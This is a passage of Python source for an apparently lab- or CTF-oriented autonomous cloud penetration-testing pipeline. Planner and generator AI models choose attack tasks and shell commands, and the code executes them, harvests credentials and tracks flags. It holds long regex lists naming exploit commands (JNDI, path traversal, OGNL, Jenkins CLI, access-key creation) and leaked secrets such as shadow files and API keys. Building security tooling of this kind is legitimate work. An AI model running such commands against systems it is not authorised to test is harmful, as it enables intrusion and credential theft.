        # Also check installed CLIs
        import shutil
        if not providers:  # Only auto-detect if nothing from description
            if shutil.which("aws"):
                providers.append("aws")
            if shutil.which("az"):
                providers.append("azure")
            if shutil.which("gcloud"):
                providers.append("gcp")

        # Default to AWS if nothing detected
        if not providers:
            providers.append("aws")

        return providers

    def run(self) -> Dict[str, Any]:
        """Run the AI-driven pipeline."""
        start_time = time.time()

        providers_str = ", ".join(p.upper() for p in self.cloud_providers)
        logger.info("\n" + "=" * 60)
        logger.info("🚀 AI-DRIVEN UNIVERSAL CLOUD PENTEST PIPELINE")
        logger.info("=" * 60)
        logger.info(f"Target: {self.target_description}")
        logger.info(f"Target URL: {self.target_url or 'N/A'}")
        logger.info(f"Cloud Providers: {providers_str}")
        logger.info(f"Planner API: {self.api.planner_api_url}")
        logger.info(f"Generator API: {self.api.generator_api_url}")
        if self.api.planner_model:
            logger.info(f"Planner model override: {self.api.planner_model}")
        if self.api.generator_model:
            logger.info(f"Generator model override: {self.api.generator_model}")
        logger.info(f"Max rounds: {self.max_rounds}")
        logger.info("=" * 60)
        logger.info("🧠 ALL decisions made by Planner/Generator AI")
        logger.info("🔧 Pipeline only executes commands and reports results")
        logger.info(f"☁️  Detected providers: {providers_str}")
        logger.info("=" * 60)

        # Health check
        if not self.api.health_check():
            logger.error("❌ API server not reachable!")
            return {"success": False, "error": "API not reachable"}
        logger.info("✅ API server connected")

        # Main loop — each iteration is one "round"
        for round_num in range(1, self.max_rounds + 1):
            self.state["round"] = round_num

            logger.info(f"\n{'=' * 60}")
            logger.info(f"🔄 ROUND {round_num}/{self.max_rounds}")
            logger.info(f"{'=' * 60}")
            logger.info(f"  Phase: {self.state['current_phase']}")
            logger.info(f"  Findings: {len(self.state['findings'])}")
            logger.info(f"  Vulns found: {len(self.state['vulnerabilities_found'])}")
            logger.info(f"  Exploits OK: {len(self.state['exploits_successful'])}")
            logger.info(f"  Credentials: {'YES' if self.state['credentials_found'] else 'NO'}")
            if self.state["flags_found"]:
                logger.info(f"  Flags (bonus): {self.state['flags_found']}")

            # ─── Update graph-lite memory snapshot (MVP) ───
            if GRAPH_LITE_AVAILABLE and build_graph_lite_state:
                try:
                    graph_lite = build_graph_lite_state(self.state, self.target_description)
                    self.state["graph_lite"] = graph_lite
                    self.state["graph_lite_summary"] = graph_lite.get("summary_text", "")
                except Exception as e:
                    logger.debug(f"Graph-lite update failed: {e}")

            # ─── Step 1: Ask Planner "What should I do?" ───
            # Trim state to avoid context overflow → Planner timeout
            planner_state = dict(self.state)
            # Truncate findings to last 10, each max 120 chars
            planner_state["findings"] = [
                f[:120] for f in self.state.get("findings", [])[-10:]
            ]
            # Summarize credentials (don't send raw keys)
            if self.state.get("credentials_found"):
                cred_keys = list(self.state["credentials_found"].keys())
                planner_state["credentials_found"] = {k: "****" for k in cred_keys}
            # Truncate tasks_completed
            planner_state["tasks_completed"] = self.state.get("tasks_completed", [])[-8:]
            # Remove execution_history (not needed for planning)
            planner_state["execution_history"] = []
            # Inject compact summary of commands already run so planner avoids repeats
            if self._commands_run_summary:
                planner_state["commands_already_tried"] = self._commands_run_summary[-20:]
            # Do not send full graph object; send compact summary only
            planner_state.pop("graph_lite", None)
            # Limit exploits lists
            planner_state["exploits_successful"] = [
                {"command": e.get("command", "")[:80]} for e in self.state.get("exploits_successful", [])[-5:]
            ]
            planner_state["exploits_failed"] = [
                {"command": e.get("command", "")[:80]} for e in self.state.get("exploits_failed", [])[-5:]
            ]
            planner_state["objective_verifications"] = self.state.get("objective_verifications", [])[-5:]
            if self.state.get("graph_lite_summary"):
                planner_state["graph_lite_summary"] = self.state["graph_lite_summary"][:1200]
            if self.state.get("graph_failure_counts"):
                planner_state["failed_action_counts"] = self.state["graph_failure_counts"]

            logger.info(f"\n  📋 Asking Planner for tasks...")

            # ── RAG: inject CVE context into planner state ──
            if RAG_AVAILABLE and _rag_instance:
                try:
                    provider = self.cloud_providers[0] if self.cloud_providers else "aws"
                    rag_services = list(self.state.get("services_detected", []))
                    if not rag_services:
                        desc_lower = self.target_description.lower()
                        for svc in ("s3", "iam", "ec2", "lambda", "ssrf", "spring",
                                    "docker", "kubernetes", "cognito", "rds", "azure",
                                    "gcp", "blob", "storage", "metadata",
                                    "grafana", "apache", "httpd", "nginx", "tomcat",
                                    "elasticsearch", "redis", "minio", "confluence",
                                    "jenkins", "log4j", "next.js", "nextjs"):
                            if svc in desc_lower:
                                rag_services.append(svc)
                        if not rag_services:
                            rag_services = [provider]
                    rag_context = _rag_instance.get_planner_context(
                        services=rag_services,
                        findings=self.state.get("findings", [])[-5:],
                        provider=provider,
                        top_k=3,
                    )
                    if rag_context and "No relevant CVEs" not in rag_context:
                        planner_state["rag_cve_context"] = rag_context
                        logger.info(f"  RAG: injected CVE context ({len(rag_context)} chars)")
                except Exception as e:
                    logger.debug(f"  RAG context failed: {e}")

            # ── Skill Router: inject few-shot examples matched to current state ──
            if SKILL_ROUTER_AVAILABLE:
                try:
                    skill, reason = route_planner_skill(self.state, self.target_description)
                    provider = infer_provider(self.state, self.target_description)
                    stack = infer_stack(self.state)
                    examples = retrieve_planner_examples(
                        skill,
                        provider,
                        stack=stack,
                        max_examples=2,
                        examples=_PLANNER_EXAMPLES_CACHE,
                    )
                    fewshot_block = format_planner_fewshot_block(skill, reason, examples)
                    if fewshot_block:
                        planner_state["skill_router_context"] = fewshot_block
                        logger.info(f"  Skill Router: {skill} ({reason})")
                except Exception as e:
                    logger.debug(f"  Skill router failed: {e}")

            tasks = self.api.get_plan(self.target_description, planner_state)

            if not tasks:
                logger.info("  ℹ️ Planner returned no tasks — pipeline complete")
                break

            logger.info(f"  📋 Planner returned {len(tasks)} task(s):")
            for i, task in enumerate(tasks, 1):
                logger.info(f"    {i}. [{task.get('phase', '?')}] {task.get('name', '?')}")

            # ─── Step 2: For each task, ask Generator for commands ───
            completed_lower = {t.lower() for t in self.state["tasks_completed"]}
            for task in tasks:
                task_name = task.get("name", "Unknown")
                task_phase = task.get("phase", "recon")

                if task_name.lower() in completed_lower:
                    logger.info(f"\n  ── Task: {task_name} ({task_phase}) — SKIPPED (already completed) ──")
                    continue

                logger.info(f"\n  ── Task: {task_name} ({task_phase}) ──")
                logger.info(f"     Instruction: {task.get('instruction', '')[:100]}")

                # Clear execution_history for each new task (keep it focused)
                self.state["execution_history"] = []

                task_state_before = copy.deepcopy(self.state)
                commands = self.api.get_commands(task, self.target_description, self.state)
                task_exec_results: List[Dict[str, Any]] = []
                tentative_state = copy.deepcopy(task_state_before)

                if commands:
                    logger.info(f"     Generator produced {len(commands)} command(s)")
                    task_exec_results, tentative_state = self._execute_with_chaining(
                        task, commands, task_name, task_phase, round_num
                    )
                else:
                    logger.info("     ⚠️ Generator returned no commands")

                self.state = tentative_state
                self._verify_and_commit_task(
                    task=task,
                    task_name=task_name,
                    command_results=task_exec_results,
                    state_before=task_state_before,
                )

                # ─── Check if flag was found during execution ───
                if self.state["flags_found"]:
                    logger.info(f"\n  🎯🏆 FLAG FOUND! Stopping pipeline early.")
                    logger.info(f"  🚩 Flag(s): {self.state['flags_found']}")
                    break

            # ─── Early stop if flag found ───
            if self.state["flags_found"]:
                logger.info(f"\n  🏆 Pipeline complete — flag captured!")
                break

            # ─── Smart phase transition ───
            # Planner ultimately decides, but we help with phase hints
            phase = self.state["current_phase"]
            has_creds = bool(self.state["credentials_found"])
            has_vulns = bool(self.state["vulnerabilities_found"])
            has_exploits = bool(self.state["exploits_successful"])

            if phase == "recon" and (has_creds or has_vulns or
                                     len(self.state["services_detected"]) >= 3):
                self.state["current_phase"] = "enum"
                logger.info(f"  📈 Phase transition: recon → enum")
            elif phase == "enum" and has_vulns:
                self.state["current_phase"] = "exploit"
                logger.info(f"  📈 Phase transition: enum → exploit")
            elif phase == "exploit" and has_exploits:
                self.state["current_phase"] = "post"
                logger.info(f"  📈 Phase transition: exploit → post")

            # ─── Stagnation detection ───
            # Compare canonical identifiers, not only collection cardinalities (Eq. 24-25).
            current_signature = (
                progress_signature(self.state) if progress_signature else tuple()
            )
            if current_signature == self._last_progress_signature:
                self._stagnation_counter += 1
                if self._stagnation_counter >= 3:
                    logger.info(f"\n  ⏸️ No new findings for {self._stagnation_counter} "
                                f"consecutive rounds — stopping to avoid wasting resources")
                    break
            else:
                self._stagnation_counter = 0
                self._last_progress_signature = current_signature

        # ─── Generate report ───
        elapsed = time.time() - start_time
        self._save_outputs()

        logger.info(f"\n{'=' * 60}")
        logger.info("✅ PIPELINE COMPLETED")
        logger.info(f"{'=' * 60}")
        logger.info(f"  Duration: {elapsed:.1f}s")
        logger.info(f"  Rounds: {self.state['round']}")
        logger.info(f"  Cloud Providers: {', '.join(p.upper() for p in self.cloud_providers)}")
        logger.info(f"  Commands executed: {len(self.execution_log)}")
        logger.info(f"  Findings: {len(self.state['findings'])}")
        logger.info(f"  Vulnerabilities: {len(self.state['vulnerabilities_found'])}")
        logger.info(f"  Exploits successful: {len(self.state['exploits_successful'])}")
        logger.info(f"  Exploits failed: {len(self.state['exploits_failed'])}")
        logger.info(f"  Credentials: {'YES' if self.state['credentials_found'] else 'NO'}")
        logger.info(f"  Secrets: {len(self.state['secrets_found'])}")
        logger.info(f"  Services: {', '.join(self.state['services_detected']) or 'None'}")

        if self.state["flags_found"]:
            logger.info(f"\n  🚩 FLAGS (bonus):")
            for flag in self.state["flags_found"]:
                logger.info(f"     → {flag}")

        if self.state["vulnerabilities_found"]:
            logger.info(f"\n  🔥 VULNERABILITIES FOUND:")
            for vuln in self.state["vulnerabilities_found"]:
                logger.info(f"     → {vuln}")

        logger.info(f"\n  📁 Output files:")
        logger.info(f"     - real_pentest_report.md")
        logger.info(f"     - real_exec_results.json")
        logger.info(f"     - real_pentest_state.json")

        return {
            "success": True,
            "duration": elapsed,
            "rounds": self.state["round"],
            "findings": len(self.state["findings"]),
            "vulnerabilities": len(self.state["vulnerabilities_found"]),
            "exploits_successful": len(self.state["exploits_successful"]),
            "exploits_failed": len(self.state["exploits_failed"]),
            "flags": self.state["flags_found"],
            "credentials_found": bool(self.state["credentials_found"]),
            "secrets_found": len(self.state["secrets_found"]),
            "commands_executed": len(self.execution_log),
        }

    # ── Vulnerability patterns for multi-cloud detection ──
    VULN_PATTERNS = {
        # --- Storage ---
        "s3_public_bucket": {
            "patterns": ["S3 PUBLIC", "public access not blocked", "Principal.*\\*", "no-sign-request"],
            "severity": "HIGH",
            "description": "S3 bucket is publicly accessible",
            "remediation": "Enable S3 Block Public Access, review bucket policies",
        },
        "azure_storage_public": {
            "patterns": ["allowBlobPublicAccess.*true", "publicAccess.*Blob", "publicAccess.*Container"],
            "severity": "HIGH",
            "description": "Azure Storage container allows public access",
            "remediation": "Disable public access on storage accounts and containers",
        },
        "gcs_public_bucket": {
            "patterns": ["allUsers", "allAuthenticatedUsers", "publicAccessPrevention.*unspecified"],
            "severity": "HIGH",
            "description": "GCS bucket is publicly accessible",
            "remediation": "Remove allUsers/allAuthenticatedUsers from bucket IAM",
        },
        # --- IAM / Permissions ---
        "iam_admin_policy": {
            "patterns": ["AdministratorAccess", '"Action": "\\*"', '"Resource": "\\*"'],
            "severity": "CRITICAL",
            "description": "IAM entity has admin/full access permissions",
            "remediation": "Apply least privilege principle",
        },
        "iam_no_mfa": {
            "patterns": ["NO MFA", "MFADevices.*\\[\\]"],
            "severity": "MEDIUM",
            "description": "IAM user does not have MFA enabled",
            "remediation": "Enable MFA for all IAM users",
        },
        "azure_role_owner": {
            "patterns": ["roleDefinitionName.*Owner", "roleDefinitionName.*Contributor"],
            "severity": "HIGH",
            "description": "Azure identity has Owner/Contributor role",
            "remediation": "Use custom roles with minimal required permissions",
        },
        "gcp_primitive_role": {
            "patterns": ["roles/owner", "roles/editor"],
            "severity": "HIGH",
            "description": "GCP uses primitive (legacy) roles",
            "remediation": "Replace primitive roles with predefined or custom IAM roles",
        },
        # --- Network / Firewall ---
        "sg_open_to_world": {
            "patterns": ["0\\.0\\.0\\.0/0", "::/0"],
            "severity": "HIGH",
            "description": "Security group/firewall allows traffic from any IP",
            "remediation": "Restrict source IPs, use VPN or bastion hosts",
        },
        "azure_nsg_any": {
            "patterns": ["sourceAddressPrefix.*\\*", "destinationPortRange.*\\*"],
            "severity": "HIGH",
            "description": "Azure NSG allows traffic from any source",
            "remediation": "Restrict NSG rules to specific IPs and ports",
        },
        # --- Secrets / Keys Exposed ---
        "exposed_access_key": {
            "patterns": ["AKIA[A-Z0-9]{16}", "SecretAccessKey"],
            "severity": "CRITICAL",
            "description": "AWS access keys potentially exposed",
            "remediation": "Rotate exposed keys immediately, use IAM roles",
        },
        "exposed_sa_key": {
            "patterns": ["client_email.*gserviceaccount", "type.*service_account"],
            "severity": "CRITICAL",
            "description": "GCP service account key exposed",
            "remediation": "Delete exposed key, use workload identity",
        },
        "azure_client_secret_exposed": {
            "patterns": ["clientSecret", "AZURE_CLIENT_SECRET"],
            "severity": "CRITICAL",
            "description": "Azure client secret exposed",
            "remediation": "Rotate client secret, use managed identities",
        },
        # --- Database ---
        "rds_public": {
            "patterns": ["PubliclyAccessible.*true", "publicly accessible"],
            "severity": "HIGH",
            "description": "Database instance is publicly accessible",
            "remediation": "Disable public access, use VPC endpoints",
        },
        "azure_sql_firewall_any": {
            "patterns": ["startIpAddress.*0\\.0\\.0\\.0", "endIpAddress.*255\\.255\\.255\\.255"],
            "severity": "HIGH",
            "description": "Azure SQL allows connections from any IP",
            "remediation": "Configure firewall to allow only specific IPs or VNets",
        },
        # --- Container / K8s ---
        "container_escape": {
            "patterns": ["privileged.*true", "hostPID.*true", "hostNetwork.*true", "CAP_SYS_ADMIN"],
            "severity": "CRITICAL",
            "description": "Container configuration allows potential escape",
            "remediation": "Remove privileged mode, use security contexts",
        },
        "eks_public_endpoint": {
            "patterns": ["endpointPublicAccess.*true", "publicAccessCidrs.*0\\.0\\.0\\.0/0"],
            "severity": "MEDIUM",
            "description": "K8s cluster API is publicly accessible",
            "remediation": "Disable public endpoint or restrict CIDRs",
        },
        # --- Lambda / Functions ---
        "lambda_env_secrets": {
            "patterns": ["Environment.*Variables.*SECRET", "Environment.*Variables.*PASSWORD"],
            "severity": "HIGH",
            "description": "Function has secrets in environment variables",
            "remediation": "Use Secrets Manager or Parameter Store",
        },
        # --- Logging / Monitoring ---
        "cloudtrail_disabled": {
            "patterns": ["No trails configured", "IsLogging.*false", "trailList.*\\[\\]"],
            "severity": "MEDIUM",
            "description": "CloudTrail logging is not enabled",
            "remediation": "Enable CloudTrail with multi-region logging",
        },
        "guardduty_disabled": {
            "patterns": ["GuardDuty.*Not enabled", "DetectorIds.*\\[\\]"],
            "severity": "MEDIUM",
            "description": "GuardDuty threat detection is not enabled",
            "remediation": "Enable GuardDuty in all regions",
        },
        # --- Encryption ---
        "unencrypted_storage": {
            "patterns": ["NOT ENCRYPTED", "Encrypted.*false", "StorageEncrypted.*false"],
            "severity": "MEDIUM",
            "description": "Storage is not encrypted at rest",
            "remediation": "Enable encryption for all storage resources",
        },
        # --- SSRF / Metadata ---
        "imds_v1_enabled": {
            "patterns": ["HttpTokens.*optional", "IMDSv1"],
            "severity": "MEDIUM",
            "description": "EC2 instance metadata v1 enabled (SSRF risk)",
            "remediation": "Enforce IMDSv2 (HttpTokens: required)",
        },
        # --- Web Application ---
        "log4j_detected": {
            "patterns": ["log4j", "jndi", "Log4Shell"],
            "severity": "CRITICAL",
            "description": "Potential Log4j/Log4Shell vulnerability",
            "remediation": "Upgrade Log4j to 2.17.1+",
        },
        "spring4shell": {
            "patterns": ["spring-core", "ClassLoader"],
            "severity": "CRITICAL",
            "description": "Potential Spring4Shell vulnerability",
            "remediation": "Upgrade Spring Framework to 5.3.18+",
        },
        # --- SSRF successful ---
        "ssrf_confirmed": {
            "patterns": ["169\\.254\\.169\\.254.*iam", "metadata\\.google\\.internal.*computeMetadata"],
            "severity": "CRITICAL",
            "description": "SSRF to cloud metadata endpoint confirmed",
            "remediation": "Fix SSRF vulnerability, enforce IMDSv2 / metadata concealment",
        },
        # --- Web CVE: File Read / Path Traversal ---
        "file_read_etc_passwd": {
            "patterns": [r"root:x?:0:0:", r"root:.*:0:0:.*:/root:", r"daemon:.*:1:1:"],
            "severity": "CRITICAL",
            "description": "Arbitrary file read confirmed (/etc/passwd leaked)",
            "remediation": "Patch path traversal vulnerability, validate file path inputs",
        },
        "file_read_etc_shadow": {
            "patterns": [r"root:\$[0-9a-z]\$", r"root:!:"],
            "severity": "CRITICAL",
            "description": "Sensitive file read confirmed (/etc/shadow leaked)",
            "remediation": "Patch path traversal vulnerability immediately",
        },
        # --- Web CVE: Remote Code Execution ---
        "rce_confirmed": {
            "patterns": [r"uid=\d+\(", r"uid=\d+\s"],
            "severity": "CRITICAL",
            "description": "Remote code execution confirmed (id command output)",
            "remediation": "Patch RCE vulnerability, apply input sanitization",
        },
        # --- Web CVE: Info Disclosure ---
        "minio_cred_leak": {
            "patterns": [r"MINIO_ROOT_USER", r"MINIO_ROOT_PASSWORD", r"MINIO_SECRET_KEY"],
            "severity": "CRITICAL",
            "description": "MinIO credentials leaked via info disclosure endpoint",
            "remediation": "Restrict access to /minio/bootstrap/v1/verify endpoint",
        },
        "docker_api_exposed": {
            "patterns": [r'"ApiVersion"\s*:', r'"ServerVersion"\s*:'],
            "severity": "CRITICAL",
            "description": "Docker daemon API exposed without authentication",
            "remediation": "Enable TLS authentication for Docker daemon API",
        },
        "spring_spel_rce": {
            "patterns": [r"routing-expression.*Runtime", r"SpEL.*exec", r"functionRouter.*500"],
            "severity": "CRITICAL",
            "description": "Spring SpEL injection RCE confirmed",
            "remediation": "Upgrade Spring Cloud Function/Gateway, disable actuator endpoints",
        },
        "confluence_ognl_rce": {
            "patterns": [r"X-Cmd-Response:.*uid=", r"OGNL.*Runtime"],
            "severity": "CRITICAL",
            "description": "Confluence OGNL injection RCE confirmed",
            "remediation": "Upgrade Confluence Server immediately",
        },
        "jsp_upload_rce": {
            "patterns": [r"CVE-\d{4}-\d+.*VERIFIED", r"test_cve\.jsp"],
            "severity": "CRITICAL",
            "description": "JSP file upload RCE confirmed (Tomcat PUT method)",
            "remediation": "Disable PUT method in Tomcat default servlet configuration",
        },
        "nextjs_middleware_bypass": {
            "patterns": [r"x-middleware-subrequest"],
            "severity": "HIGH",
            "description": "Next.js middleware bypass via x-middleware-subrequest header",
            "remediation": "Upgrade Next.js to patched version",
        },
        "jenkins_file_read": {
            "patterns": [r"JENKINS_HOME", r"jenkins.*secret\.key"],
            "severity": "CRITICAL",
            "description": "Jenkins CLI arbitrary file read confirmed",
            "remediation": "Upgrade Jenkins, restrict CLI access",
        },
        "grafana_path_traversal": {
            "patterns": [r"grafana\.ini", r"plugins/alertlist/\.\./"],
            "severity": "HIGH",
            "description": "Grafana path traversal vulnerability confirmed",
            "remediation": "Upgrade Grafana to 8.3.1+",
        },
        "env_credential_leak": {
            "patterns": [
                r"DB_CONNECTION_STRING.*Password",
                r"STRIPE_SECRET_KEY",
                r"SENDGRID_API_KEY",
                r"JWT_SECRET",
                r"FUNCTIONS_WORKER_RUNTIME",
                r"AzureWebJobsStorage.*AccountKey",
            ],
            "severity": "CRITICAL",
            "description": "Application credentials leaked via /env or /config endpoint",
            "remediation": "Restrict access to environment/config endpoints",
        },
        "api_key_leak": {
            "patterns": [
                r"masterKey.*azure",
                r"functionKeys",
                r"systemKeys",
                r"publishingPassword",
                r"scmUri.*azurewebsites",
            ],
            "severity": "CRITICAL",
            "description": "API keys/deployment credentials exposed without authentication",
            "remediation": "Require authentication for key management endpoints",
        },
        "cloud_secret_exposure": {
            "patterns": [
                r"AccountKey=[A-Za-z0-9+/=]{20,}",
                r"DefaultEndpointsProtocol.*AccountName",
                r"sk_live_\w+",
                r"SG\.[A-Za-z0-9_-]{20,}",
                r"sharedAccessPolicies.*primaryKey",
            ],
            "severity": "CRITICAL",
            "description": "Cloud service secret keys exposed in API response",
            "remediation": "Implement proper access controls and secret management",
        },
        "admin_panel_exposed": {
            "patterns": [
                r'"runbookType"',
                r'"parameterDefinitions"',
                r"consoleText.*BUILD",
                r"JENKINS_HOME",
                r"deploy-production",
            ],
            "severity": "HIGH",
            "description": "Admin/management panel accessible without proper authentication",
            "remediation": "Implement authentication and RBAC for admin endpoints",
        },
        "k8s_secrets_exposed": {
            "patterns": [
                r'"kind"\s*:\s*"SecretList"',
                r'"kind"\s*:\s*"Secret"',
                r"clusterrolebindings.*cluster-admin",
                r"oauthaccesstokens",
            ],
            "severity": "CRITICAL",
            "description": "Kubernetes secrets accessible without proper RBAC",
            "remediation": "Configure proper RBAC and restrict secret access",
        },
    }

    # Patterns in commands that indicate exploit attempts
    EXPLOIT_CMD_PATTERNS = [
        r"s3 cp ", r"s3 sync ", r"s3 mv ",
        r"--no-sign-request",
        r"sqlmap", r"sqlcmd",
        r"run-command invoke", r"vm run-command",
        r"exec -it.*bash", r"exec -it.*sh",
        r"create-user", r"create-access-key", r"attach.*policy",
        r"az keyvault secret show", r"gcloud secrets versions access",
        r"curl.*jndi", r"curl.*\$\{",
        r"mount /dev/", r"chroot",
        r"ssh.*@", r"mysql -h", r"psql -h",
        r"nmap -s",
        # Web CVE exploit patterns
        r"--path-as-is",
        r"\.\.(/|%2[fF]|%252[fF])",
        r"%2[eE]%2[eE]",
        r"%%32%65",
        r"curl.*functionRouter",
        r"routing-expression",
        r"actuator/gateway/routes",
        r"script_fields.*groovy",
        r"curl.*-X\s+PUT.*\.jsp",
        r"minio/bootstrap",
        r"redis-cli.*eval",
        r"x-middleware-subrequest",
        r"jenkins-cli\.jar",
        r"classLoader.*pipeline",
        r"template/aui/text-inline",
        r"OGNL|ognl",
        r"setupadministrator",
        r"curl.*etc/passwd",
        r"exec\(.*id",
        # Credential/secret endpoint access patterns
        r"curl.*/env\b",
        r"curl.*/config\b",
        r"curl.*/secrets",
        r"curl.*/credentials",
        r"curl.*/api/keys",
        r"curl.*/api/secrets",
        r"curl.*/api/tokens",
        r"curl.*/api/settings",
        r"curl.*/api/host/keys",
        r"curl.*/api/admin/",
        r"curl.*/api/auth/",
        r"curl.*/api/deploymentcredentials",
        r"curl.*/api/workspace/tokens",
        r"curl.*/api/workspace/keys",
        r"curl.*/_apis/tokens",
        r"curl.*/_apis/serviceendpoint",
        r"curl.*/_apis/distributedtask/variablegroups",
        r"curl.*/api/v1/namespaces.*/secrets",
        r"curl.*/credentials/store",
        r"curl.*/script\b",
        r"curl.*/actuator/env",
        r"curl.*/actuator/configprops",
        r"curl.*/wp-config",
        r"curl.*/api/agent/config",
        r"curl.*/v2/_catalog",
        r"curl.*/proxy\?url=",
        r"curl.*/fetch\?url=",
    ]

    def _parse_output(self, command: str, result: Dict, task_context: Optional[Dict[str, Any]] = None):
        """
        Passively parse command output — multi-cloud sensing.
        This is SENSING, not DECIDING.
        Extract credentials (AWS/Azure/GCP), flags, vulns, findings from raw output.
        Also track exploit attempts and their success/failure.
        """
        stdout = result.get("stdout", "")
        stderr = result.get("stderr", "")
        combined = stdout + "\n" + stderr

        # ── Extract ALL cloud credentials (AWS + Azure + GCP) ──
        creds = OutputParser.extract_credentials(stdout)
        if not creds:
            creds = OutputParser.extract_credentials(stderr)

        if creds:
            new_creds = {k: v for k, v in creds.items()
                         if k not in self.state["credentials_found"]}
            if new_creds:
                # Categorize and log
                for k, v in new_creds.items():
                    if k.startswith("AWS_"):
                        provider = "AWS"
                    elif k.startswith("AZURE_"):
                        provider = "Azure"
                    elif k.startswith("GCP_") or k.startswith("GOOGLE_"):
                        provider = "GCP"
                    else:
                        provider = "Cloud"
                    masked = v[:8] + "..." if len(v) > 8 else "****"
                    if "SECRET" in k.upper() or "KEY" in k.upper() or "PASSWORD" in k.upper():
                        masked = "****"
                    logger.info(f"     🔑 {provider} credential: {k}={masked}")
                    self.state["findings"].append(f"🚨 {provider} credential extracted: {k}")

                self.state["credentials_found"].update(new_creds)
                self._store_credential_set(self.state["credentials_found"])

        # ── Extract flags ──
        flags = OutputParser.extract_flags(combined)
        for flag in flags:
            if flag not in self.state["flags_found"]:
                self.state["flags_found"].append(flag)
                self.state["findings"].append(f"🚩 FLAG: {flag}")
                logger.info(f"     🚩 FLAG FOUND: {flag}")

        # ── Extract findings ──
        findings = OutputParser.extract_findings(command, stdout, stderr)
        for finding in findings:
            if finding not in self.state["findings"]:
                self.state["findings"].append(finding)

        # ── Extract secrets ──
        secrets = OutputParser.extract_secrets(stdout, command[:30])
        for secret in secrets:
            if secret not in self.state["secrets_found"]:
                self.state["secrets_found"].append(secret)

        # ── Scan for vulnerabilities in output + command context ──
        # We check both command and output because vuln indicators can appear
        # in either (e.g., SSRF URLs in command, credentials in output)
        scan_text = command + "\n" + combined
        for vuln_id, vuln_info in self.VULN_PATTERNS.items():
            for pattern in vuln_info["patterns"]:
                try:
                    if re.search(pattern, scan_text, re.IGNORECASE):
                        vuln_entry = {
                            "id": vuln_id,
                            "severity": vuln_info["severity"],
                            "description": vuln_info["description"],
                            "remediation": vuln_info["remediation"],
                            "found_in_cmd": command[:120],
                            "round": self.state["round"],
                        }
                        # Deduplicate by id
                        if not any(v["id"] == vuln_id for v in self.state["vulnerabilities_found"]):
                            self.state["vulnerabilities_found"].append(vuln_entry)
                            self.state["findings"].append(
                                f"🔥 [{vuln_info['severity']}] {vuln_info['description']}"
                            )
                            logger.info(
                                f"     🔥 VULN: [{vuln_info['severity']}] "
                                f"{vuln_info['description']} ({vuln_id})"
                            )
                        break  # One match per vuln_id is enough
                except re.error as e:
                    logger.debug(f"Invalid vuln regex pattern for {vuln_id}: {e}")

        # ── Track exploit attempts ──
        cmd_lower_for_exploit = command.lower()
        is_exploit_attempt = any(
            re.search(p, cmd_lower_for_exploit) for p in self.EXPLOIT_CMD_PATTERNS
        )
        if is_exploit_attempt:
            self.state["exploit_attempted"] = True
            # Detect false-positive success: exit code 0 but output contains
            # AWS/Azure/GCP error messages (common when piped through 2>&1 | head)
            actually_succeeded = result["success"] and not self._is_false_positive_success(result)
            exploit_entry = {
                "command": command[:200],
                "round": self.state["round"],
                "success": actually_succeeded,
            }
            if actually_succeeded:
                if not any(e["command"] == exploit_entry["command"]
                           for e in self.state["exploits_successful"]):
                    self.state["exploits_successful"].append(exploit_entry)
                    logger.info(f"     ⚔️ Exploit SUCCEEDED: {command[:80]}")
            else:
                if not any(e["command"] == exploit_entry["command"]
                           for e in self.state["exploits_failed"]):
                    self.state["exploits_failed"].append(exploit_entry)
                    logger.info(f"     ⚔️ Exploit FAILED: {command[:80]}")
                    # Track failure in graph for replanning decisions
                    if GRAPH_LITE_AVAILABLE and self.state.get("graph_lite"):
                        try:
                            from cage_cloud.graph import GraphState
                            current_task = task_context or {}
                            graph = GraphState()
                            graph.add_failure(
                                action_type=current_task.get("name", result.get("task", "unknown_exploit")),
                                reason=stderr[:200] if stderr else "non-zero exit",
                            )
                            self.state.setdefault("graph_failure_counts", {})
                            action_key = current_task.get("name", result.get("task", "unknown"))
                            self.state["graph_failure_counts"][action_key] = \
                                self.state["graph_failure_counts"].get(action_key, 0) + 1
                        except Exception:
                            pass

        # ── Parse error signals (stderr or false-positive stdout) ──
        combined_err = (stderr + " " + (stdout if self._is_false_positive_success(result) else "")).lower()
        if combined_err.strip() and (not result["success"] or self._is_false_positive_success(result)):
            if "accessdenied" in combined_err or "accessdeniedexception" in combined_err:
                finding = f"🔒 Access denied: {command[:80]}"
                if finding not in self.state["findings"]:
                    self.state["findings"].append(finding)
            elif "unauthorized" in combined_err or "403" in combined_err:
                finding = f"🔒 Unauthorized (403): {command[:80]}"
                if finding not in self.state["findings"]:
                    self.state["findings"].append(finding)
            elif "not found" in combined_err or "nosuchbucket" in combined_err or "nosuchkey" in combined_err:
                finding = f"ℹ️ Not found: {command[:80]}"
                if finding not in self.state["findings"]:
                    self.state["findings"].append(finding)

        # ── Detect services from commands (multi-cloud) ──
        cmd_lower = command.lower()
        service_detectors = {
            # Web
            "actuator": "spring-boot-actuator",
            # AWS
            "169.254.169.254": "ec2-metadata",
            # Azure
            "az account": "azure-account",
            "az storage": "azure-storage",
            "az keyvault": "azure-keyvault",
            "az vm": "azure-vm",
            "az webapp": "azure-webapp",
            "az functionapp": "azure-functions",
            # GCP
            "gcloud compute": "gce",
            "gcloud storage": "gcs",
            "gsutil": "gcs",
            "gcloud secrets": "gcp-secrets",
            "gcloud iam": "gcp-iam",
            "gcloud run": "cloud-run",
            "gcloud functions": "cloud-functions",
            "metadata.google.internal": "gcp-metadata",
        }

        for keyword, service in service_detectors.items():
            if keyword in cmd_lower and result["success"]:
                if service not in self.state["services_detected"]:
                    self.state["services_detected"].append(service)

        # AWS S3
        if result["success"] and ("s3" in cmd_lower or "list-buckets" in cmd_lower):
            if "s3" not in self.state["services_detected"]:
                self.state["services_detected"].append("s3")

        # AWS IAM
        if result["success"] and ("iam" in cmd_lower or "sts" in cmd_lower):
            if "aws-iam" not in self.state["services_detected"]:
                self.state["services_detected"].append("aws-iam")

        # ── Track web endpoints found ──
        if result["success"] and "actuator" in cmd_lower:
            endpoint_match = re.search(r"/actuator/?\w*", cmd_lower)
            if endpoint_match:
                ep = endpoint_match.group(0)
                if ep not in self.state["web_endpoints"]:
                    self.state["web_endpoints"].append(ep)

        # Track proxy/SSRF endpoints
        if result["success"] and "/proxy" in cmd_lower:
            if "/proxy" not in self.state["web_endpoints"]:
                self.state["web_endpoints"].append("/proxy")

        # ── Detect target info from actuator/env ──
        if "actuator/env" in cmd_lower and result["success"]:
            try:
                data = json.loads(stdout)
                for ps in data.get("propertySources", []):
                    if ps.get("name") == "systemEnvironment":
                        for k, v in ps.get("properties", {}).items():
                            val = v.get("value", "") if isinstance(v, dict) else str(v)
                            if val and val != "******":
